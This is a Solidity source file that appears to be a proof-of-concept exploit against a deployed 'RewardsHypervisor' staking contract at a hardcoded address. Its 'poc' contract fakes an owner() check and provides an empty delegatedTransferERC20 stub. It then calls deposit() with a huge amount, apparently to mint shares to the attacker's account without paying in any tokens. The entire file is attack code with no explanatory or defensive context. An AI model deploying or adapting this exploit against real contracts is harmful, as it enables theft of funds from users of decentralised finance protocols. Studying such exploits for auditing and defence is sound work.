// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface IRewardsHypervisor {
    function deposit(
        uint256 visrDeposit,
        address from,
        address to
    ) external returns (uint256 shares);

    function owner() external view returns (address);

    function snapshot() external;

    function transferOwnership(address newOwner) external;

    function transferTokenOwnership(address newOwner) external;

    function visr() external view returns (address);

    function vvisr() external view returns (address);

    function withdraw(
        uint256 shares,
        address to,
        address from
    ) external returns (uint256 rewards);
}


contract poc{
    
    address RewardsHypervisor_Address = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    address public EOA_Address;

    constructor() {

        EOA_Address =  msg.sender;
    
    }

    function attack() external{

        IRewardsHypervisor(RewardsHypervisor_Address).deposit(100000000000000000000000000,address(this),EOA_Address);

    }


    function owner() external returns(address){

        return(address(this));

    }


    function delegatedTransferERC20(address token, address to, uint256 amount) external{}

}